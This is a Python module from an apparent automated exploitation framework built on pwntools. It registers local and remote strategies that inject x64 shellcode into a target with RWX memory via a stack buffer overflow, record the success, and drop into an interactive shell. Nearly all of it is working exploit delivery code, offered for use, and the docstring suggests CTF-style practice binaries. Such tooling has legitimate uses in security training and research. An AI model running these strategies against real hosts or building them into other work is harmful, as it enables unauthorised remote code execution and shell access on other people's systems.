"""P7.6: x64 rwx shellcode strategies (local + remote).

Replaces the v3.1 monolith's ``rwx_shellcode_x64`` (L1954-1973, local)
+ ``rwx_shellcode_x64_remote`` (L2208-2227, remote) ad-hoc
functions with two :class:`ExploitStrategy` subclasses.

x64 specifics
-------------
* x64 shellcode (``shellcraft.sh()``) is ~48 bytes vs x32's ~44.
* ``p64`` for the BSS return address; the rest of the
  payload construction is identical to x32.

The x64 RWX strategy is **the same exploit pattern as x32**;
the only difference is the 64-bit pointer width.  In v4.0
baseline, ``rip`` is the only binary with ``rwx_segments=True``
(per ``logs/v4.0/rip.log``), but ``rip`` is also reachable via
ret2system (priority 150) — so rwx_shellcode (priority 90)
won't fire on the baseline.  It will fire on any future
binary where RWX is present but no system/binsh are accessible.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import (
    print_info,
    print_payload,
    print_section_header,
)
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RWX_SHELLCODE
from autopwn.exp.registry import register
from autopwn.primitives.shellcode import RwxShellcodeX64
from autopwn.report.model import ExploitInfo


# ---------------------------------------------------------------------------
# Local x64 strategy
# ---------------------------------------------------------------------------


@register
class RwxShellcodeX64LocalStrategy(ExploitStrategy):
    """Local 64-bit RWX shellcode injection.

    Metadata (``requires_*``):
      * ``arch = 64``
      * ``remote = False``
      * ``requires = ("rwx_segments",)``
    """
    name = "rwx-shellcode-x64"
    priority = RWX_SHELLCODE
    requires_arch = 64
    requires_remote = False
    requires = ("rwx_segments",)

    def matches(self, ctx: ExploitContext) -> bool:
        """Override to read ``rwx_segments`` from ``ctx.binary.*``.

        See ``rwx_shellcode_x32.py`` module docstring for the
        rationale (first strategy to gate on a BinaryInfo field
        rather than a top-level ctx field).
        """
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        return bool(ctx.binary.rwx_segments)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit RWX shellcode locally."""
        from pwn import process

        print_section_header("EXPLOITATION: RWX Shellcode - x64")
        print_payload("preparing RWX shellcode exploit")

        primitive = RwxShellcodeX64()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("rwx-shellcode-x64 primitive returned empty; skipping")
            return False

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="RWX Shellcode - x64",
            payload=payload,
            padding=ctx.padding,
            addresses={},
            vulnerability_type="Stack Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        from autopwn.report import record_success
        record_success(info)

        io.interactive()
        return True


# ---------------------------------------------------------------------------
# Remote x64 strategy
# ---------------------------------------------------------------------------


@register
class RwxShellcodeX64RemoteStrategy(ExploitStrategy):
    """Remote 64-bit RWX shellcode injection."""
    name = "rwx-shellcode-x64-remote"
    priority = RWX_SHELLCODE
    requires_arch = 64
    requires_remote = True
    requires = ("rwx_segments",)

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        return bool(ctx.binary.rwx_segments)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit RWX shellcode against a remote service."""
        from pwn import remote

        if ctx.remote is None:
            print_info("rwx-shellcode-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: RWX Shellcode - x64 Remote")
        print_payload("preparing remote RWX shellcode exploit")

        primitive = RwxShellcodeX64()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("rwx-shellcode-x64-remote primitive returned empty; skipping")
            return False

        io = remote(host, port)
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="RWX Shellcode - x64 Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={},
            vulnerability_type="Stack Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        from autopwn.report import record_success
        record_success(info)

        io.interactive()
        return True


__all__ = [
    "RwxShellcodeX64LocalStrategy",
    "RwxShellcodeX64RemoteStrategy",
]
